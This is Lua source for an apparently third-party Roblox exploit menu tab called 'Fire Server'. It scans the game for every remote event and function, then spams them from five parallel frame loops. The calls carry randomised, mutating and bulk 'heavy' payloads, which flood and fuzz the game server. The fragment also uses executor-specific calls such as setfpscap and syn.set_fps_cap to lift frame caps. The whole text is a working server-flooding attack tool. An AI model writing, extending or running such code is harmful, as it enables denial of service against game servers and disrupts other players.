_Tabs.FireServer = function(overridePage)    local tab = (not overridePage) and (CreatedTabs and CreatedTabs["Fire Server"])
    if not overridePage and (not tab or not tab.CreateSection) then return end
    local fsAccent = Color3.fromRGB(230, 230, 230)
    local function _cs(title, subtitle)
        if overridePage then
            return Section.new(overridePage, fsAccent, title, subtitle)
        else
            return tab:CreateSection(title, subtitle)
        end
    end
    local RS                 = RunService
    local spamActive         = false
    local spamToken          = 0
    local totalFires         = 0
    local fireRateSec        = 0
    local spamRate           = 500
    local sharedRateCounter  = 0
    local sharedRateResetAt  = 0
    local targetMode         = "All"
    local customNameFilter   = ""
    local payloadMode        = "nil"
    local discoveredRemotes  = {}
    local stfActive          = false
    local stfToken           = 0
    local stfRemote          = nil
    local stfRate            = 200
    local stfStatusLabel     = nil
    local remoteListScroll   = nil
    local mutationActive     = false
    local mutationInterval   = 50
    local mutationCycle      = 0
    local mutationIdx        = 1
    local MUTATION_POOL      = { "nil", "true/false", "random number", "random string", "empty table" }
    local savedPayloadMode   = nil
    local logSampleCounter   = 0
    local retryQueue         = {}
    local statsFiresLabel, statsRateLabel, liveStatusLabel, liveRemotesLabel
    local playBtn, playStroke
    local threadCount        = 4
    local desyncEnabled      = true
    local heavyPayload       = false
    local heavySize          = 500
    local burstMode          = false
    local burstSize          = 20
    local burstPause         = 0.05
    local invokeFlood        = false
    local rotateRemotes      = true
    local antiLagActive      = false
    local fpsUnlockActive    = false
    local charFreezeActive   = false
    local charFreezeConn     = nil
    local activeThreads      = 0
    local _fsConns           = {}
    local spamDelay          = 0
    local _scanStatusLabel    = nil
    local _scanCountLabel     = nil
    local _scanStatusDot      = nil
    local function scanRemotes()
        discoveredRemotes = {}
        pcall(function()
            local function recurse(parent, depth)
                if depth > 100 then return end
                local ok2, children = pcall(function() return parent:GetChildren() end)
                if not ok2 then return end
                for _, child in ipairs(children) do
                    if child:IsA("RemoteEvent") then
                        table.insert(discoveredRemotes, { name = child.Name, inst = child, kind = "Event" })
                    elseif child:IsA("RemoteFunction") then
                        table.insert(discoveredRemotes, { name = child.Name, inst = child, kind = "Function" })
                    end
                    recurse(child, depth + 1)
                end
            end
            recurse(game, 1)
        end)
        return #discoveredRemotes
    end
    local function buildPayload()
        if     payloadMode == "nil"           then return nil
        elseif payloadMode == "true/false"    then return math.random(0, 1) == 1
        elseif payloadMode == "random number" then return math.random(1, 999999)
        elseif payloadMode == "random string" then
            local c = "abcdefghijklmnopqrstuvwxyz0123456789"
            local s = ""
            for _ = 1, math.random(4, 16) do
                local i = math.random(1, #c)
                s = s .. c:sub(i, i)
            end
            return s
        elseif payloadMode == "empty table" then return {}
        end
        return nil
    end
    local function buildHeavyBlob()
        local blob = {}
        for i = 1, heavySize do
            blob[i] = { id = i, v = math.random(0, 0xFFFF), s = tostring(math.random()) }
        end
        return blob
    end
    local function buildFinalPayload()
        local base = buildPayload()
        if heavyPayload then
            if type(base) == "table" then
                base.__heavy = buildHeavyBlob()
                return base
            else
                return { base = base, heavy = buildHeavyBlob() }
            end
        end
        return base
    end
    local function tryUnlockFPS()
        pcall(function()
            if typeof(setfpscap) == "function" then setfpscap(0) return end
            if typeof(syn) == "table" and typeof(syn.set_fps_cap) == "function" then
                syn.set_fps_cap(0) return
            end
            if _G and typeof(_G.setfpscap) == "function" then _G.setfpscap(0) return end
            local fenv = typeof(getfenv) == "function" and getfenv(0) or nil
            if fenv and typeof(fenv.setfpscap) == "function" then fenv.setfpscap(0) end
        end)
    end
    local function tryRestoreFPS()
        pcall(function()
            if typeof(setfpscap) == "function" then setfpscap(60) return end
            if typeof(syn) == "table" and typeof(syn.set_fps_cap) == "function" then
                syn.set_fps_cap(60) return
            end
            if _G and typeof(_G.setfpscap) == "function" then _G.setfpscap(60) return end
        end)
    end
    local function startCharFreeze()
        if charFreezeConn then return end
        charFreezeConn = DirectConnect(GetSignal(RS, "Heartbeat"), function()
            pcall(function()
                local char = LocalPlayer and LocalPlayer.Character
                if not char then return end
                local root = char:FindFirstChild("HumanoidRootPart")
                local hum  = char:FindFirstChildOfClass("Humanoid")
                if root and hum then
                    root.AssemblyLinearVelocity  = Vector3.new(0, root.AssemblyLinearVelocity.Y, 0)
                    root.AssemblyAngularVelocity = Vector3.zero
                end
            end)
        end)
    end
    local function stopCharFreeze()
        if charFreezeConn then
            pcall(function() charFreezeConn:Disconnect() end)
            charFreezeConn = nil
        end
    end
    do
        local _fsLP = Players and Players.LocalPlayer
        if _fsLP then
            SafeConnect(GetSignal(_fsLP, "CharacterAdded"), function(newChar)
                stopCharFreeze()
                charFreezeActive = false
                task.spawn(function()
                    task.wait(0.1)
                    pcall(function()
                        local hum = newChar:FindFirstChildOfClass("Humanoid")
                        if hum and hum.Health <= 0 then hum.Health = hum.MaxHealth end
                    end)
                end)
            end)
        end
    end
    local function getTargetRemotes()
        local list = {}
        for _, r in ipairs(discoveredRemotes) do
            local ok = false
            if     targetMode == "All"            then ok = true
            elseif targetMode == "Events Only"    then ok = r.kind == "Event"
            elseif targetMode == "Functions Only" then ok = r.kind == "Function"
            elseif targetMode == "Custom"         then
                ok = customNameFilter ~= "" and
                     string.find(r.name:lower(), customNameFilter:lower(), 1, true) ~= nil
            end
            if ok then table.insert(list, r) end
        end
        return list
    end
    local function startSpam(preResolvedTargets)
        if spamActive then return end
        _HM_Install()
        spamActive        = true
        spamToken         = spamToken + 1
        totalFires        = 0
        activeThreads     = 0
        sharedRateCounter = 0
        fireRateSec       = 0
        mutationCycle     = 0
        mutationIdx       = 1
        logSampleCounter  = 0
        _fsConns          = {}
        if statsRateLabel  then statsRateLabel.Text  = "Fires / sec: " .. _CHR.EM_DASH end
        if statsFiresLabel then statsFiresLabel.Text = "Total Fires: 0" end
        local myToken = spamToken
        if antiLagActive then
            if fpsUnlockActive  then tryUnlockFPS()   end
            if charFreezeActive then startCharFreeze() end
        end
        task.spawn(function()
            local targets = (preResolvedTargets and #preResolvedTargets > 0)
                            and preResolvedTargets
                            or  getTargetRemotes()
            if #targets == 0 then
                spamActive = false
                pcall(function()
                    if liveStatusLabel  then
                        liveStatusLabel.Text       = _CHR.BULLET .. " NO TARGETS"
                        liveStatusLabel.TextColor3 = Color3.fromRGB(143, 143, 143)
                    end
                    if liveRemotesLabel then liveRemotesLabel.Text = "Targets: " .. _CHR.EM_DASH end
                end)
                return
            end
            local targetCount = #targets
            local capThreads  = math.max(1, threadCount)
            local fpk         = math.max(1, math.ceil(spamRate / 30) * capThreads)
            local stormMult   = math.max(1, capThreads * 8)
            local totalMult   = 32 * fpk + stormMult * 4
            activeThreads     = 5
            local evRemotes, fnRemotes = {}, {}
            for _, r in ipairs(targets) do
                if r.inst and r.inst.Parent then
                    if r.kind == "Function" then fnRemotes[#fnRemotes + 1] = r.inst
                    else                         evRemotes[#evRemotes + 1] = r.inst end
                end
            end
            local evCount = #evRemotes
            local fnCount = #fnRemotes
            local FRAME_BUDGET = 0.0015
            local capDelay     = spamDelay / 1000
            local _fireIdx     = 0
            local function _mutateIfActive()
                if not mutationActive then return end
                mutationCycle = mutationCycle + 1
                if mutationCycle >= mutationInterval then
                    mutationCycle = 0
                    mutationIdx   = (mutationIdx % #MUTATION_POOL) + 1
                    payloadMode   = MUTATION_POOL[mutationIdx]
                end
            end
            local function _coreFireLoop(withMutation)
                if withMutation then _mutateIfActive() end
                local t0      = tick()
                local payload = buildFinalPayload()
                local hitEv, hitFn = 0, 0
                if evCount >= 1 then
                    local evArr, evN = evRemotes, evCount
                    pcall(function()
                        for _ = 1, totalMult do
                            for ei = 1, evN do evArr[ei]:FireServer(payload) end
                            hitEv = hitEv + evN
                            if tick() - t0 > FRAME_BUDGET then break end
                        end
                    end)
                end
                if fnCount >= 1 then
                    local fnArr, fnN = fnRemotes, fnCount
                    local t1 = tick()
                    pcall(function()
                        for _ = 1, totalMult do
                            for fi = 1, fnN do fnArr[fi]:InvokeServer(payload) end
                            hitFn = hitFn + fnN
                            if tick() - t1 > FRAME_BUDGET then break end
                        end
                    end)
                end
                if evCount == 0 and fnCount == 0 then
                    local t2 = tick()
                    pcall(function()
                        for _ = 1, totalMult do
                            _fireIdx = _fireIdx + 1
                            local r  = targets[((_fireIdx - 1) % targetCount) + 1]
                            if r and r.inst and r.inst.Parent then
                                if r.kind == "Function" then r.inst:InvokeServer(payload)
                                else                         r.inst:FireServer(payload) end
                                hitEv = hitEv + 1
                            end
                            if tick() - t2 > FRAME_BUDGET then break end
                        end
                    end)
                end
                local total       = hitEv + hitFn
                totalFires        = totalFires        + total
                sharedRateCounter = sharedRateCounter + total
            end
            local _lt1, _lt2, _lt3, _lt4, _lt5 = 0, 0, 0, 0, 0
            local c1 = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                if capDelay > 0 then
                    local n = tick()
                    if n - _lt1 < capDelay then return end
                    _lt1 = n
                end
                _coreFireLoop(true)
            end)
            _fsConns[#_fsConns + 1] = c1
            local c2 = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                if capDelay > 0 then
                    local n = tick()
                    if n - _lt2 < capDelay then return end
                    _lt2 = n
                end
                _coreFireLoop(false)
            end)
            _fsConns[#_fsConns + 1] = c2
            local c3 = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                if capDelay > 0 then
                    local n = tick()
                    if n - _lt3 < capDelay then return end
                    _lt3 = n
                end
                _coreFireLoop(false)
            end)
            _fsConns[#_fsConns + 1] = c3
            local c4 = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                if capDelay > 0 then
                    local n = tick()
                    if n - _lt4 < capDelay then return end
                    _lt4 = n
                end
                _coreFireLoop(false)
            end)
            _fsConns[#_fsConns + 1] = c4
            local c5 = RunService.Stepped:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                if capDelay > 0 then
                    local n = tick()
                    if n - _lt5 < capDelay then return end
                    _lt5 = n
                end
                _coreFireLoop(false)
            end)
            _fsConns[#_fsConns + 1] = c5
            local frameAcc = 0
            local cDisp = RunService.Heartbeat:Connect(function()
                if not spamActive or spamToken ~= myToken then return end
                frameAcc = frameAcc + 1
                if frameAcc < 120 then return end
                frameAcc = 0
                local snapshotRate = sharedRateCounter
                fireRateSec        = snapshotRate
                sharedRateCounter  = 0
                task.defer(function()
                    pcall(function()
                        if statsFiresLabel then
                            statsFiresLabel.Text = "Total Fires: " .. tostring(totalFires)
                        end
                        if statsRateLabel then
                            local rStr
                            if     snapshotRate >= 1000000 then rStr = string.format("%.2fM", snapshotRate / 1000000)
                            elseif snapshotRate >= 1000    then rStr = string.format("%.1fK", snapshotRate / 1000)
                            else                                rStr = tostring(snapshotRate) end
                            statsRateLabel.Text = "Fires / sec: ~" .. rStr
                                .. "  [5-CONN OVERPOWER | Ev+" .. tostring(evCount)
                                .. " Fn+" .. tostring(fnCount) .. "]"
                        end
                    end)
                end)
            end)
            _fsConns[#_fsConns + 1] = cDisp
        end)
    end
    local function stopSpam()
        _HM_Uninstall()
        spamActive        = false
        spamToken         = spamToken + 1
        fireRateSec       = 0
        activeThreads     = 0
        sharedRateCounter = 0
        retryQueue        = {}
        for _, c in ipairs(_fsConns) do pcall(function() c:Disconnect() end) end
        _fsConns = {}
        stopCharFreeze()
        if fpsUnlockActive then tryRestoreFPS() end
        stfActive = false
        stfToken  = stfToken + 1
        pcall(function()
            if stfStatusLabel then
                stfStatusLabel.Text       = "  [OFF] Stopped."
                stfStatusLabel.TextColor3 = Color3.fromRGB(135, 135, 135)
            end
        end)
    end
